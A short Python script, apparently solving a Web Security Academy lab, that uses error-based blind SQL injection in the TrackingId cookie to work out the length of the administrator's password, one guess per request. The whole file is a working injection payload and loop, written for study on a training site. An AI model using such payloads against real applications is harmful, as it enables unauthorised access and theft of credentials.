import time
import requests
from itertools import chain

url = 'https://ac601f931e9e36ba8072033b0041008a.web-security-academy.net/'
cookies = {
    "TrackingId": '', 
    "session": "H2huqYLvDRxZXpj0bxJxLHjkXc4IyOLu"
}

password_len = 0

def getVal(i):
    return 'EyUs4E275FzlG6nY\'  and ((select length(password) from users where username=\'administrator\') = {i} or 1/0 = 1) --'.format(i=i)

num_http_calls = 0
i = 0

while password_len == 0 and i < 20:
    i += 1
    print('trying length: {i}'.format(i=i))
    cookies['TrackingId'] = getVal(i)
    response = requests.get(url, cookies=cookies)

    num_http_calls += 1
    if response.status_code == 200:
        password_len = i

print('password length: {len}'.format(len=password_len))
print('i: {i}'.format(i=i))